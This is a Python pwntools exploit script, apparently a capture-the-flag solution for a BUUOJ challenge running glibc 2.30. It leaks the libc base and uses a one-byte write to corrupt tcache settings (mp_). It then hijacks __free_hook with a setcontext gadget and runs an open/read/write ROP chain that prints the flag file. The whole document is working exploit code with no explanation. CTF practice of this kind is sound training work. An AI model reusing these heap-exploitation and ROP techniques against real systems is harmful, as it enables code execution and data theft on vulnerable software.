from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27038)
libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.30-0ubuntu2.2_amd64/libc-2.30.so')
elf = ELF('./pwn')



io.recvuntil('GIFT: ')
libc_base = int(io.recvline()[:-1], 16) - libc.sym['_IO_2_1_stdout_']
log.success('libc_base: ' + hex(libc_base))
open = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
__free_hook = libc_base + libc.sym['__free_hook']
mp_ = libc_base + 0x1ea280
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]
gadget = libc_base + 0x0000000000154b20
setcontext = libc_base + libc.sym['setcontext'] + 0x3d
pop_rdi_ret = libc_base + 0x0000000000026bb2
pop_rsi_ret = libc_base + 0x000000000002709c
pop_rdx_r12_ret = libc_base + 0x000000000011c3b1
ret = libc_base + 0x00000000000256b9

io.sendafter('You can write a byte anywhere\n', p64(mp_ + 0x51))
io.sendafter('And what?\n', p8(0x7f))

io.sendlineafter('Offset:\n', str(0xde8))
io.sendafter('Content:\n', p64(__free_hook))

io.sendlineafter('size:\n', str(0x2000))
# gdb.attach(io)
filename = b'./flag'
flag_addr = filename_addr = __free_hook + 0x10
ROPchain_addr = __free_hook + 0xb0
ROPchain = p64(pop_rdi_ret) + p64(filename_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_r12_ret) + p64(0) * 2 + p64(open)
ROPchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_r12_ret) + p64(0x40) + p64(0) + p64(read)
ROPchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_r12_ret) + p64(0x40) + p64(0) + p64(write)
payload = p64(gadget) + p64(__free_hook) + filename.ljust(0x10, b'\x00') + p64(setcontext)
payload = payload.ljust(0xa0, b'\x00')
payload += p64(ROPchain_addr) + p64(ret)
payload += ROPchain
io.sendlineafter('>>', payload)
# pause()
io.interactive()
